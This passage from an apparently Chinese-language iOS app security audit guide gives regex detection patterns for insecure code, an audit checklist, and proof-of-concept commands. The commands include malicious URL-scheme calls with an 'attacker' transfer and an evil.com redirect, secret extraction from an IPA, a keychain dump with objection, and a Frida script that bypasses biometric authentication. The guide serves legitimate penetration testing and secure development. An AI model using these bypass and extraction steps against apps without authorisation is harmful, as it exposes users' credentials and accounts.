UserDefaults.*(?:token|password|secret|key|credential|auth|session)
UserDefaults.*set\(.*forKey

# 文件保护
NSFileProtection|FileProtectionType\.none|protectionKey

# 后台安全
applicationDidEnterBackground|sceneDidEnterBackground|scenePhase

# Extension
TRUEPREDICATE|NSExtensionActivationRule

# 剪贴板
UIPasteboard\.general\.(string|image|url|items)

# 越狱检测 (确认存在)
/Applications/Cydia|MobileSubstrate|jailbreak|/bin/bash|/usr/sbin/sshd

# 生物认证
LAContext|evaluatePolicy|canEvaluatePolicy|deviceOwnerAuthentication
evaluatedPolicyDomainState|biometryCurrentSet

# SSL/TLS
URLAuthenticationChallenge|serverTrust|SecTrustEvaluate|DisabledTrustEvaluator
NSURLAuthenticationMethodServerTrust|\.useCredential

# 日志泄露
NSLog\(.*(?:token|password|secret|key|credential)|print\(.*(?:token|password|secret)
os_log\(.*(?:token|password|secret)

# 硬编码密钥/密码
(?:let|var)\s+(?:password|secret|apiKey|token)\s*=\s*"[^"]{3,}"
(?:let|var)\s+(?:key|iv|salt)\s*=\s*"[^"]{3,}"

# 不安全的随机数
arc4random\(\)|srand\(|rand\(\)
# 应使用 SecRandomCopyBytes 或 CryptoKit

# 网络请求 - URL 拼接
URL\(string:.*\\\(|URLRequest.*\\\(

# CoreData / SQLite
NSPersistentContainer|NSManagedObjectContext|sqlite3_open
```

---

## 快速审计检查清单

```markdown
[ ] 检查 Info.plist 中 ATS 配置 (NSAllowsArbitraryLoads)
[ ] 审计所有 URL Scheme 处理入口 (application:openURL:, scene:openURLContexts:)
[ ] 审计 Universal Links 处理 (application:continueUserActivity:)
[ ] 检查 apple-app-site-association 文件路径配置
[ ] 检查 Keychain 存储使用的 kSecAttrAccessible 级别
[ ] 搜索 UserDefaults 中是否存储敏感数据
[ ] 审计 WKWebView 配置和 JS Bridge
[ ] 检查 evaluateJavaScript 中的字符串拼接
[ ] 检查 SSL/TLS 证书验证 (是否有 .useCredential 无条件信任)
[ ] 审计文件保护级别 (FileProtectionType)
[ ] 检查后台截屏保护 (applicationDidEnterBackground)
[ ] 检查推送通知中的敏感内容
[ ] 审计 Extension 的 NSExtensionActivationRule
[ ] 检查 App Group 共享容器中的数据保护
[ ] 检查 UIPasteboard.general 中的敏感数据操作
[ ] 验证越狱检测实现 (多层检测)
[ ] 审计生物认证实现 (是否仅依赖布尔值)
[ ] 检查 evaluatedPolicyDomainState 变更处理
[ ] 搜索硬编码密钥和密码
[ ] 检查日志中的敏感信息泄露 (NSLog, print, os_log)
[ ] 审计 Entitlement 文件权限范围
[ ] 检查备份排除设置 (isExcludedFromBackup)
[ ] 检查不安全的随机数生成 (arc4random 用于安全场景)
```

---

## 最小 PoC 示例

```bash
# 测试 URL Scheme (使用 xcrun simctl 在模拟器中)
xcrun simctl openurl booted "myapp://transfer?to=attacker&amount=10000"
xcrun simctl openurl booted "myapp://deeplink?url=https://evil.com"

# 检查 ATS 配置
plutil -p Info.plist | grep -i "NSAllowsArbitraryLoads\|NSExceptionDomains"

# 提取 IPA 中的敏感信息
unzip app.ipa -d extracted
strings extracted/Payload/App.app/App | grep -i "api_key\|secret\|password\|token"

# 检查 Entitlements
codesign -d --entitlements :- extracted/Payload/App.app

# 检查 Keychain 访问级别 (越狱设备)
# 使用 keychain-dumper 或 objection
objection -g "com.example.app" explore
# > ios keychain dump

# Frida hook 生物认证
frida -U -n "App" -e '
ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"].implementation =
    function(policy, reason, reply) {
        var callback = new ObjC.Block(reply);
        callback.implementation = function(success, error) {
            callback.invoke(true, null);  // 绕过生物认证
        };
        this.evaluatePolicy_localizedReason_reply_(policy, reason, callback);
    };
'

# 检查 IPA 是否包含调试符号
dwarfdump extracted/Payload/App.app/App | head -20
```

---

## 参考资源

- [Apple App Security Overview](https://support.apple.com/guide/security/app-security-overview-sec35dd877d0/web)
- [OWASP Mobile Security Testing Guide (iOS)](https://mas.owasp.org/MASTG/iOS/0x06a-Platform-Overview/)
- [Apple Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [App Transport Security Technote](https://developer.apple.com/documentation/bundleresources/information_property_list/nsapptransportsecurity)
- [WKWebView Security](https://developer.apple.com/documentation/webkit/wkwebview)
- [DeviceCheck / App Attest](https://developer.apple.com/documentation/devicecheck)
- [iOS Application Security (DVIA)](https://damnvulnerableiosapp.com/)
